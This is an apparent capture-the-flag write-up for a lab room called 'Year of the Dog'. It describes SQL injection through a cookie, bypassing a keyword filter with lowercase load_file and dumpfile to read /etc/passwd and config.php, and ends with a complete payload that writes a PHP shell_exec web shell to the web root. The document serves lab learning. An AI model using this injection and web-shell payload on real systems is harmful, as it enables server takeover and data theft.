# Year of the Dog

A hard room! Having fun!

- A scan revealed only `22` and `80`
- On `80`, a page with no interaction that told me I was in a queue. A cookie was being set - clearing it randomly assigned me a new cookie and a new position in the queue
- The cookie value, if changed to `id='` triggered a mysql error. Via this, I discovered it was a server with one database, webapp, containing one table queue with two columns `userId` and `queueNum`. There seemed to be some primitive 'RCE protection in place' - certain queries would throw an error.
- I discovered that lowercase load_file and dumpfile worked (uppercase versions triggered the RCE error) - I extracted `/etc/passwd` this way, seeing there was a user named dylan
- Via this vuln, I got the `config.php` file (guessing correctly it was at `/var/www/html` and loading it into a text file in the same directory that I could access) and `index.php`
- `config.php` gave me the db creds. With `index.php` I could see that in addition to the banned words, `<` and `>` was blocked making PHP injection difficult. 
- however, I was able to get a primitive web shell via: `Cookie: id='+UNION+ALL+SELECT+'',concat(char(60),'?php+echo+shell_exec($_GET["e"])+?',char(62))+INTO+dumpfile+'/var/www/html/shell.php'+--+`, abusing MySql's `char` command to get around the `<`/`>` limits.
